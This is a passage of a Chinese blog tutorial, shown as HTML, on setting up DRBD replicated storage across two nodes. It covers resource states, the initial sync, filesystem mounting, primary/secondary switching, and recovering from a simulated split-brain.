'</span>nod2<span class="string">' (RSA) to the list of known hosts.</span></div><div class="line"><span class="string">root@nod2'</span>s password:</div><div class="line">global_common.conf 100% 1943 1.9KB/s  00:00 </div><div class="line">drbd.res 100% 318 0.3KB/s  00:00</div></pre></td></tr></table></figure>
<h3 id="6-初始化资源并启动服务"><a href="#6-初始化资源并启动服务" class="headerlink" title="6.初始化资源并启动服务"></a>6.初始化资源并启动服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment">######在NOD1节点上初始化资源并启动服务</span></div><div class="line">[root@nod1 ~]<span class="comment"># drbdadm create-md drbd</span></div><div class="line">Writing meta data...</div><div class="line">initializing activity <span class="built_in">log</span></div><div class="line">NOT initializing bitmap</div><div class="line">lk_bdev_save(/var/lib/drbd/drbd-minor-0.lkbd) failed: No such file or directory</div><div class="line">New drbd meta data block successfully created.  <span class="comment">#提示已经创建成功</span></div><div class="line">lk_bdev_save(/var/lib/drbd/drbd-minor-0.lkbd) failed: No such file or directory</div><div class="line"><span class="comment">######启动服务</span></div><div class="line">[root@nod1 ~]<span class="comment"># service drbd start</span></div><div class="line">Starting DRBD resources: [</div><div class="line"> create res: drbd</div><div class="line"> prepare disk: drbd</div><div class="line"> adjust disk: drbd</div><div class="line"> adjust net: drbd</div><div class="line">]</div><div class="line">..........</div><div class="line">***************************************************************</div><div class="line"> DRBD<span class="string">'s startup script waits for the peer node(s) to appear.</span></div><div class="line"><span class="string"> - In case this node was already a degraded cluster before the</span></div><div class="line"><span class="string"> reboot the timeout is 0 seconds. [degr-wfc-timeout]</span></div><div class="line"><span class="string"> - If the peer was available before the reboot the timeout will</span></div><div class="line"><span class="string"> expire after 0 seconds. [wfc-timeout]</span></div><div class="line"><span class="string"> (These values are for resource '</span>drbd<span class="string">'; 0 sec -&gt; wait forever)</span></div><div class="line"><span class="string"> To abort waiting enter '</span>yes<span class="string">' [ 12]: yes</span></div><div class="line"><span class="string">######查看监听端口</span></div><div class="line"><span class="string">[root@nod1 ~]# ss -tanl |grep 7789</span></div><div class="line"><span class="string">LISTEN 0 5 192.168.137.225:7789 *:*</span></div></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment">######在NOD2节点上初始化资源并启动服务</span></div><div class="line">[root@nod2 ~]<span class="comment"># drbdadm create-md drbd</span></div><div class="line">Writing meta data...</div><div class="line">initializing activity <span class="built_in">log</span></div><div class="line">NOT initializing bitmap</div><div class="line">lk_bdev_save(/var/lib/drbd/drbd-minor-0.lkbd) failed: No such file or directory</div><div class="line">New drbd meta data block successfully created.</div><div class="line">lk_bdev_save(/var/lib/drbd/drbd-minor-0.lkbd) failed: No such file or directory</div><div class="line"><span class="comment">######启动服务</span></div><div class="line">[root@nod2 ~]<span class="comment"># service drbd start</span></div><div class="line">Starting DRBD resources: [</div><div class="line"> create res: drbd</div><div class="line"> prepare disk: drbd</div><div class="line"> adjust disk: drbd</div><div class="line"> adjust net: drbd</div><div class="line">]</div><div class="line"><span class="comment">######查看监听地址与端口</span></div><div class="line">[root@nod2 ~]<span class="comment"># netstat -anput|grep 7789</span></div><div class="line">tcp 0 0 192.168.137.222:42345 192.168.137.225:7789 ESTABLISHED - </div><div class="line">tcp 0 0 192.168.137.222:7789 192.168.137.225:42325 ESTABLISHED -</div><div class="line"><span class="comment">######查看DRBD启动状态</span></div><div class="line">[root@nod2 ~]<span class="comment"># drbd-overview</span></div><div class="line"> 0:drbd/0  Connected Secondary/Secondary Inconsistent/Inconsistent C r-----</div></pre></td></tr></table></figure>
<h3 id="7-资源的连接状态详细介绍"><a href="#7-资源的连接状态详细介绍" class="headerlink" title="7.资源的连接状态详细介绍"></a>7.资源的连接状态详细介绍</h3><h4 id="如何查看资源连接状态？"><a href="#如何查看资源连接状态？" class="headerlink" title="如何查看资源连接状态？"></a>如何查看资源连接状态？</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[root@nod1 ~]<span class="comment"># drbdadm cstate drbd #drbd为资源名称</span></div><div class="line">Connected</div></pre></td></tr></table></figure>
<h4 id="资源的连接状态；一个资源可能有以下连接状态中的一种"><a href="#资源的连接状态；一个资源可能有以下连接状态中的一种" class="headerlink" title="资源的连接状态；一个资源可能有以下连接状态中的一种"></a>资源的连接状态；一个资源可能有以下连接状态中的一种</h4><ul>
<li>StandAlone 独立的：网络配置不可用；资源还没有被连接或是被管理断开（使用 drbdadm disconnect 命令），或是由于出现认证失败或是脑裂的情况</li>
<li>Disconnecting 断开：断开只是临时状态，下一个状态是StandAlone独立的</li>
<li>Unconnected 悬空：是尝试连接前的临时状态，可能下一个状态为WFconnection和WFReportParams</li>
<li>Timeout 超时：与对等节点连接超时，也是临时状态，下一个状态为Unconected悬空</li>
<li>BrokerPipe：与对等节点连接丢失，也是临时状态，下一个状态为Unconected悬空</li>
<li>NetworkFailure：与对等节点推动连接后的临时状态，下一个状态为Unconected悬空</li>
<li>ProtocolError：与对等节点推动连接后的临时状态，下一个状态为Unconected悬空</li>
<li>TearDown 拆解：临时状态，对等节点关闭，下一个状态为Unconected悬空</li>
<li>WFConnection：等待和对等节点建立网络连接</li>
<li>WFReportParams：已经建立TCP连接，本节点等待从对等节点传来的第一个网络包</li>
<li>Connected 连接：DRBD已经建立连接，数据镜像现在可用，节点处于正常状态</li>
<li>StartingSyncS：完全同步，有管理员发起的刚刚开始同步，未来可能的状态为SyncSource或PausedSyncS</li>
<li>StartingSyncT：完全同步，有管理员发起的刚刚开始同步，下一状态为WFSyncUUID</li>
<li>WFBitMapS：部分同步刚刚开始，下一步可能的状态为SyncSource或PausedSyncS</li>
<li>WFBitMapT：部分同步刚刚开始，下一步可能的状态为WFSyncUUID</li>
<li>WFSyncUUID：同步即将开始，下一步可能的状态为SyncTarget或PausedSyncT</li>
<li>SyncSource：以本节点为同步源的同步正在进行</li>
<li>SyncTarget：以本节点为同步目标的同步正在进行</li>
<li>PausedSyncS：以本地节点是一个持续同步的源，但是目前同步已经暂停，可能是因为另外一个同步正在进行或是使用命令(drbdadm pause-sync)暂停了同步</li>
<li>PausedSyncT：以本地节点为持续同步的目标，但是目前同步已经暂停，这可以是因为另外一个同步正在进行或是使用命令(drbdadm pause-sync)暂停了同步</li>
<li>VerifyS：以本地节点为验证源的线上设备验证正在执行</li>
<li>VerifyT：以本地节点为验证目标的线上设备验证正在执行</li>
</ul>
<h4 id="资源角色"><a href="#资源角色" class="headerlink" title="资源角色"></a>资源角色</h4><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看资源角色命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[root@nod1 ~]<span class="comment"># drbdadm role drbd</span></div><div class="line">Secondary/Secondary</div><div class="line">[root@nod1 ~]<span class="comment"># cat /proc/drbd</span></div><div class="line">version: 8.4.3 (api:1/proto:86-101)</div><div class="line">GIT-hash: 89a294209144b68adb3ee85a73221f964d3ee515 build by gardner@, 2013-05-27 04:30:21</div><div class="line"> 0: cs:Connected ro:Secondary/Secondary ds:Inconsistent/Inconsistent C r-----</div><div class="line"> ns:0 nr:0 dw:0 dr:0 al:0 bm:0 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:2103412</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注释：</p>
<ul>
<li>Parimary 主：资源目前为主，并且可能正在被读取或写入，如果不是双主只会出现在两个节点中的其中一个节点上</li>
<li>Secondary 次：资源目前为次，正常接收对等节点的更新</li>
<li>Unknown 未知：资源角色目前未知，本地的资源不会出现这种状态</li>
</ul>
<h4 id="硬盘状态"><a href="#硬盘状态" class="headerlink" title="硬盘状态"></a>硬盘状态</h4><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看硬盘状态命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[root@nod1 ~]<span class="comment"># drbdadm dstate drbd</span></div><div class="line">Inconsistent/Inconsistent</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;本地和对等节点的硬盘有可能为下列状态之一：</p>
<ul>
<li>Diskless 无盘：本地没有块设备分配给DRBD使用，这表示没有可用的设备，或者使用drbdadm命令手工分离或是底层的I/O错误导致自动分离</li>
<li>Attaching：读取无数据时候的瞬间状态</li>
<li>Failed 失败：本地块设备报告I/O错误的下一个状态，其下一个状态为Diskless无盘</li>
<li>Negotiating：在已经连接的DRBD设置进行Attach读取无数据前的瞬间状态</li>
<li>Inconsistent：数据是不一致的，在两个节点上（初始的完全同步前）这种状态出现后立即创建一个新的资源。此外，在同步期间（同步目标）在一个节点上出现这种状态</li>
<li>Outdated：数据资源是一致的，但是已经过时</li>
<li>DUnknown：当对等节点网络连接不可用时出现这种状态</li>
<li>Consistent：一个没有连接的节点数据一致，当建立连接时，它决定数据是UpToDate或是Outdated</li>
<li>UpToDate：一致的最新的数据状态，这个状态为正常状态</li>
</ul>
<h4 id="启用和禁用资源"><a href="#启用和禁用资源" class="headerlink" title="启用和禁用资源"></a>启用和禁用资源</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">######手动启用资源</span></div><div class="line">drbdadm up &lt;resource&gt;</div><div class="line"><span class="comment">######手动禁用资源</span></div><div class="line">drbdadm down &lt;resource&gt;</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注释：</p>
<ul>
<li>resource：为资源名称；当然也可以使用all表示[停用|启用]所有资源</li>
</ul>
<h4 id="升级和降级资源"><a href="#升级和降级资源" class="headerlink" title="升级和降级资源"></a>升级和降级资源</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">######升级资源</span></div><div class="line">drbdadm primary &lt;resource&gt;</div><div class="line"><span class="comment">######降级资源</span></div><div class="line">drbdadm secondary &lt;resource&gt;</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注释：在单主模式下的DRBD，两个节点同时处于连接状态，任何一个节点都可以在特定的时间内变成主；但两个节点中只能一为主，如果已经有一个主，需先降级才可能升级；在双主模式下没有这个限制</p>
<h3 id="8-初始化设备同步"><a href="#8-初始化设备同步" class="headerlink" title="8.初始化设备同步"></a>8.初始化设备同步</h3><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;选择一个初始同步源；如果是新初始化的或是空盘，这个选择可以是任意的，但是如果其中的一个节点已经在使用并包含有用的数据，那么选择同步源是至关重要的；如果选错了初始化同步方向，就会造成数据丢失，因此需要十分小心</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;启动初始化完全同步，这一步只能在初始化资源配置的一个节点上进行，并作为同步源选择的节点上；命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">[root@nod1 ~]<span class="comment"># drbdadm -- --overwrite-data-of-peer primary drbd</span></div><div class="line">[root@nod1 ~]<span class="comment"># cat /proc/drbd #查看同步进度</span></div><div class="line">version: 8.4.3 (api:1/proto:86-101)</div><div class="line">GIT-hash: 89a294209144b68adb3ee85a73221f964d3ee515 build by gardner@, 2013-05-27 04:30:21</div><div class="line"> 0: cs:SyncSource ro:Primary/Secondary ds:UpToDate/Inconsistent C r---n-</div><div class="line"> ns:1897624 nr:0 dw:0 dr:1901216 al:0 bm:115 lo:0 pe:3 ua:3 ap:0 ep:1 wo:f oos:207988</div><div class="line"> [=================&gt;..] sync<span class="string">'ed: 90.3% (207988/2103412)K</span></div><div class="line"><span class="string"> finish: 0:00:07 speed: 26,792 (27,076) K/sec</span></div><div class="line"><span class="string">######当同步完成时如以下状态</span></div><div class="line"><span class="string">version: 8.4.3 (api:1/proto:86-101)</span></div><div class="line"><span class="string">GIT-hash: 89a294209144b68adb3ee85a73221f964d3ee515 build by gardner@, 2013-05-27 04:30:21</span></div><div class="line"><span class="string"> 0: cs:Connected ro:Primary/Secondary ds:UpToDate/UpToDate C r-----</span></div><div class="line"><span class="string"> ns:2103412 nr:0 dw:0 dr:2104084 al:0 bm:129 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:0</span></div><div class="line"><span class="string">注释： drbd：为资源名称</span></div><div class="line"><span class="string">######查看同步进度也可使用以下命令</span></div><div class="line"><span class="string">drbd-overview</span></div></pre></td></tr></table></figure>
<h3 id="9-创建文件系统"><a href="#9-创建文件系统" class="headerlink" title="9.创建文件系统"></a>9.创建文件系统</h3><h4 id="文件系统只能挂载在主-Primary-节点上，因此在设置好主节点后才可以对DRBD设备进行格式化操作"><a href="#文件系统只能挂载在主-Primary-节点上，因此在设置好主节点后才可以对DRBD设备进行格式化操作" class="headerlink" title="文件系统只能挂载在主(Primary)节点上，因此在设置好主节点后才可以对DRBD设备进行格式化操作"></a>文件系统只能挂载在主(Primary)节点上，因此在设置好主节点后才可以对DRBD设备进行格式化操作</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">######格式化文件系统</span></div><div class="line">[root@nod1 ~]<span class="comment"># mkfs.ext4 /dev/drbd0</span></div><div class="line"><span class="comment">######挂载文件系统</span></div><div class="line">[root@nod1 ~]<span class="comment"># mount /dev/drbd0 /mnt/</span></div><div class="line"><span class="comment">######查看挂载</span></div><div class="line">[root@nod1 ~]<span class="comment"># mount |grep drbd0</span></div><div class="line">/dev/drbd0 on /mnt <span class="built_in">type</span> ext4 (rw)</div><div class="line">注释：</div><div class="line"><span class="string">"/dev/drbd0"</span>为资源中定义已定义的资源名称</div><div class="line"><span class="comment">######查看DRBD状态</span></div><div class="line">[root@nod1 ~]<span class="comment"># drbd-overview</span></div><div class="line"> 0:drbd/0  Connected Primary/Secondary UpToDate/UpToDate C r-----</div><div class="line">注释：</div><div class="line">Primary：当前节点为主；在前面为当前节点</div><div class="line">Secondary：备用节点为次</div></pre></td></tr></table></figure>
<h4 id="在挂载目录中创建一个测试文件并卸载；然后"><a href="#在挂载目录中创建一个测试文件并卸载；然后" class="headerlink" title="在挂载目录中创建一个测试文件并卸载；然后"></a>在挂载目录中创建一个测试文件并卸载；然后</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[root@nod1 ~]<span class="comment"># mkdir /mnt/test</span></div><div class="line">[root@nod1 ~]<span class="comment"># ls /mnt/</span></div><div class="line">lost+found  <span class="built_in">test</span></div><div class="line"><span class="comment">######在切换主节点时必须保证资源不在使用</span></div><div class="line">[root@nod1 ~]<span class="comment"># umount /mnt/</span></div></pre></td></tr></table></figure>
<h4 id="切换主备节点"><a href="#切换主备节点" class="headerlink" title="切换主备节点"></a>切换主备节点</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">######先把当前主节点降级为次</span></div><div class="line">[root@nod1 ~]<span class="comment"># drbdadm secondary drbd</span></div><div class="line"><span class="comment">######查看DRBD状态</span></div><div class="line">[root@nod1 ~]<span class="comment"># drbd-overview</span></div><div class="line"> 0:drbd/0  Connected Secondary/Secondary UpToDate/UpToDate C r-----</div><div class="line"><span class="comment">######在NOD2节点升级</span></div><div class="line">[root@nod2 ~]<span class="comment"># drbdadm primary drbd</span></div><div class="line"><span class="comment">######查看DRBD状态</span></div><div class="line">[root@nod2 ~]<span class="comment"># drbd-overview</span></div><div class="line"> 0:drbd/0  Connected Primary/Secondary UpToDate/UpToDate C r-----</div></pre></td></tr></table></figure>
<h4 id="挂载设备并验证文件是否存在"><a href="#挂载设备并验证文件是否存在" class="headerlink" title="挂载设备并验证文件是否存在"></a>挂载设备并验证文件是否存在</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[root@nod2 ~]<span class="comment"># mount /dev/drbd0 /mnt/</span></div><div class="line">[root@nod2 ~]<span class="comment"># ls /mnt/</span></div><div class="line">lost+found  <span class="built_in">test</span></div></pre></td></tr></table></figure>
<h2 id="七、DRBD脑裂的模拟及修复"><a href="#七、DRBD脑裂的模拟及修复" class="headerlink" title="七、DRBD脑裂的模拟及修复"></a>七、DRBD脑裂的模拟及修复</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注释：我们还接着上面的实验继续进行，现在NOD2为主节点而NOD1为备节点</p>
<h3 id="1。断开主-parmary-节点"><a href="#1。断开主-parmary-节点" class="headerlink" title="1。断开主(parmary)节点"></a>1。断开主(parmary)节点</h3><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;关机、断开网络或重新配置其他的IP都可以；这里选择的是断开网络</p>
<h3 id="2-查看两节点状态"><a href="#2-查看两节点状态" class="headerlink" title="2.查看两节点状态"></a>2.查看两节点状态</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[root@nod2 ~]<span class="comment"># drbd-overview</span></div><div class="line"> 0:drbd/0  WFConnection Primary/Unknown UpToDate/DUnknown C r----- /mnt ext4 2.0G 68M 1.9G 4%</div><div class="line">[root@nod1 ~]<span class="comment"># drbd-overview</span></div><div class="line"> 0:drbd/0  StandAlone Secondary/Unknown UpToDate/DUnknown r-----</div><div class="line"><span class="comment">######由上可以看到两个节点已经无法通信；NOD2为主节点，NOD1为备节点</span></div></pre></td></tr></table></figure>
<h3 id="3-将NOD1节点升级为主-primary-节点并挂载资源"><a href="#3-将NOD1节点升级为主-primary-节点并挂载资源" class="headerlink" title="3.将NOD1节点升级为主(primary)节点并挂载资源"></a>3.将NOD1节点升级为主(primary)节点并挂载资源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[root@nod1 ~]<span class="comment"># drbdadm primary drbd</span></div><div class="line">[root@nod1 ~]<span class="comment"># drbd-overview</span></div><div class="line"> 0:drbd/0  StandAlone Primary/Unknown UpToDate/DUnknown r-----</div><div class="line">[root@nod1 ~]<span class="comment"># mount /dev/drbd0 /mnt/</span></div><div class="line">[root@nod1 ~]<span class="comment"># mount | grep drbd0</span></div><div class="line">/dev/drbd0 on /mnt <span class="built_in">type</span> ext4 (rw)</div></pre></td></tr></table></figure>
<h3 id="4-假如原来的主-primary-节点修复好重新上线了，这时出现了脑裂情况"><a href="#4-假如原来的主-primary-节点修复好重新上线了，这时出现了脑裂情况" class="headerlink" title="4.假如原来的主(primary)节点修复好重新上线了，这时出现了脑裂情况"></a>4.假如原来的主(primary)节点修复好重新上线了，这时出现了脑裂情况</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">[root@nod2 ~]<span class="comment"># tail -f /var/log/messages</span></div><div class="line">Sep 19 01:56:06 nod2 kernel: d-con drbd: Terminating drbd_a_drbd</div><div class="line">Sep 19 01:56:06 nod2 kernel: block drbd0: helper <span class="built_in">command</span>: /sbin/drbdadm initial-split-brain minor-0 <span class="built_in">exit</span> code 0 (0x0)</div><div class="line">Sep 19 01:56:06 nod2 kernel: block drbd0: Split-Brain detected but unresolved, dropping connection!</div><div class="line">Sep 19 01:56:06 nod2 kernel: block drbd0: helper <span class="built_in">command</span>: /sbin/drbdadm split-brain minor-0</div><div class="line">Sep 19 01:56:06 nod2 kernel: block drbd0: helper <span class="built_in">command</span>: /sbin/drbdadm split-brain minor-0 <span class="built_in">exit</span> code 0 (0x0)</div><div class="line">Sep 19 01:56:06 nod2 kernel: d-con drbd: conn( NetworkFailure -&gt; Disconnecting )</div><div class="line">Sep 19 01:56:06 nod2 kernel: d-con drbd: error receiving ReportState, e: -5 l: 0!</div><div class="line">Sep 19 01:56:06 nod2 kernel: d-con drbd: Connection closed</div><div class="line">Sep 19 01:56:06 nod2 kernel: d-con drbd: conn( Disconnecting -&gt; StandAlone )</div><div class="line">Sep 19 01:56:06 nod2 kernel: d-con drbd: receiver terminated</div><div class="line">Sep 19 01:56:06 nod2 kernel: d-con drbd: Terminating drbd_r_drbd</div><div class="line">Sep 19 01:56:18 nod2 kernel: block drbd0: role( Primary -&gt; Secondary )</div></pre></td></tr></table></figure>
<h3 id="5-再次查看两节点的状态"><a href="#5-再次查看两节点的状态" class="headerlink" title="5.再次查看两节点的状态"></a>5.再次查看两节点的状态</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[root@nod1 ~]<span class="comment"># drbdadm role drbd</span></div><div class="line">Primary/Unknown</div><div class="line">[root@nod2 ~]<span class="comment"># drbdadm role drbd</span></div><div class="line">Primary/Unknown</div></pre></td></tr></table></figure>
<h3 id="6-查看NOD1与NOD2连接状态"><a href="#6-查看NOD1与NOD2连接状态" class="headerlink" title="6.查看NOD1与NOD2连接状态"></a>6.查看NOD1与NOD2连接状态</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[root@nod1 ~]<span class="comment"># drbd-overview</span></div><div class="line"> 0:drbd/0  StandAlone Primary/Unknown UpToDate/DUnknown r----- /mnt ext4 2.0G 68M 1.9G 4%</div><div class="line">[root@nod2 ~]<span class="comment"># drbd-overview</span></div><div class="line"> 0:drbd/0  WFConnection Primary/Unknown UpToDate/DUnknown C r----- /mnt ext4 2.0G 68M 1.9G 4%</div><div class="line"><span class="comment">######由上可见，状态为StandAlone时，主备节点是不会通信的</span></div></pre></td></tr></table></figure>
<h3 id="7-查看DRBD的服务状态"><a href="#7-查看DRBD的服务状态" class="headerlink" title="7.查看DRBD的服务状态"></a>7.查看DRBD的服务状态</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">[root@nod1 ~]<span class="comment"># service drbd status</span></div><div class="line">drbd driver loaded OK; device status:</div><div class="line">version: 8.4.3 (api:1/proto:86-101)</div><div class="line">GIT-hash: 89a294209144b68adb3ee85a73221f964d3ee515 build by gardner@, 2013-05-27 04:30:21</div><div class="line">m:res cs ro ds p mounted fstype</div><div class="line">0:drbd StandAlone Primary/Unknown  UpToDate/DUnknown  r----- ext4</div><div class="line">[root@nod2 ~]<span class="comment"># service drbd status</span></div><div class="line">drbd driver loaded OK; device status:</div><div class="line">version: 8.4.3 (api:1/proto:86-101)</div><div class="line">GIT-hash: 89a294209144b68adb3ee85a73221f964d3ee515 build by gardner@, 2013-05-27 04:30:21</div><div class="line">m:res cs ro ds p mounted fstype</div><div class="line">0:drbd WFConnection Primary/Unknown  UpToDate/DUnknown  C  /mnt  ext4</div></pre></td></tr></table></figure>
<h3 id="8-在NOD1备用节点处理办法"><a href="#8-在NOD1备用节点处理办法" class="headerlink" title="8.在NOD1备用节点处理办法"></a>8.在NOD1备用节点处理办法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">[root@nod1 ~]<span class="comment"># umount /mnt/</span></div><div class="line">[root@nod1 ~]<span class="comment"># drbdadm disconnect drbd</span></div><div class="line">drbd: Failure: (162) Invalid configuration request</div><div class="line">additional info from kernel:</div><div class="line">unknown connection</div><div class="line">Command <span class="string">'drbdsetup disconnect ipv4:192.168.137.225:7789 ipv4:192.168.137.222:7789'</span> terminated with <span class="built_in">exit</span> code 10</div><div class="line">[root@nod1 ~]<span class="comment"># drbdadm secondary drbd</span></div><div class="line">[root@nod1 ~]<span class="comment"># drbd-overview</span></div><div class="line"> 0:drbd/0  StandAlone Secondary/Unknown UpToDate/DUnknown r-----</div><div class="line">[root@nod1 ~]<span class="comment"># drbdadm connect --discard-my-data drbd</span></div><div class="line"><span class="comment">######执行完以上三步后，你查看会发现还是不可用</span></div><div class="line">[root@nod1 ~]<span class="comment"># drbd-overview</span></div><div class="line"> 0:drbd/0  WFConnection Secondary/Unknown UpToDate/DUnknown C r-----</div></pre></td></tr></table></figure>
<h3 id="9-需要在NOD2节点上重新建立连接资源"><a href="#9-需要在NOD2节点上重新建立连接资源" class="headerlink" title="9.需要在NOD2节点上重新建立连接资源"></a>9.需要在NOD2节点上重新建立连接资源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[root@nod2 ~]<span class="comment"># drbdadm connect drbd</span></div><div class="line"><span class="comment">######查看节点连接状态</span></div><div class="line">[root@nod2 ~]<span class="comment"># drbd-overview</span></div><div class="line"> 0:drbd/0  Connected Primary/Secondary UpToDate/UpToDate C r----- /mnt ext4 2.0G 68M 1.9G 4%</div><div class="line">[root@nod1 ~]<span class="comment"># drbd-overview</span></div><div class="line"> 0:drbd/0  Connected Secondary/Primary UpToDate/UpToDate C r-----</div><div class="line"><span class="comment">######由上可见已经恢复到正常运行状态</span></div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<strong>注意</strong>：特别提醒，如果是单主模式，资源只能在主(Primary)节点上挂载使用，而且不建议手动切换主备节点</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;<strong>到此DRBD的安装配置及故障修复已结束，DRBD的双主模式一般情况不会用到，这里也不再介绍双主模式的配置</strong></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HA集群/">HA集群</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-HA集群/3. heartbeat和keepalived的区别" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2017/09/03/HA集群/3. heartbeat和keepalived的区别/" class="article-date">
  	<time datetime="2017-09-02T18:04:46.007Z" itemprop="datePublished">2017-09-03</time>
</a>
    </div>
  
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/09/03/HA集群/3. heartbeat和keepalived的区别/">
        heartbeat和keepalived的区别
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
